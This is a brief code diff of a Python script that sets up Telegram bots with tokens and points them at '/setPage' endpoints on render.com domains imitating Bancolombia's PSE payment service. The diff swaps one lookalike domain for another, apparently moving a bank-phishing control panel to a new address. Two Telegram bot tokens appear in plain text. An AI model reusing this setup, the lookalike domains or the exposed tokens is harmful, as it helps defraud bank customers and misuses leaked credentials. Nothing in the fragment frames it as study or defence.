@@ -3,8 +3,8 @@ import requests
 import threading
 # Credenciales de los bots
 BOTS = [
-    {"token": "7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI", "server_url": "https://pagosbancolombiapseapp.onrender.com/setPage"},
-    {"token": "7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY", "server_url": "https://pagosbancolombiapseapp.onrender.com/setPage"}
+    {"token": "7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI", "server_url": "https://mispagospsebancolombia.onrender.com/setPage"},
+    {"token": "7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY", "server_url": "https://mispagospsebancolombia.onrender.com/setPage"}
 ]
 
 # Diccionario para manejar múltiples bots
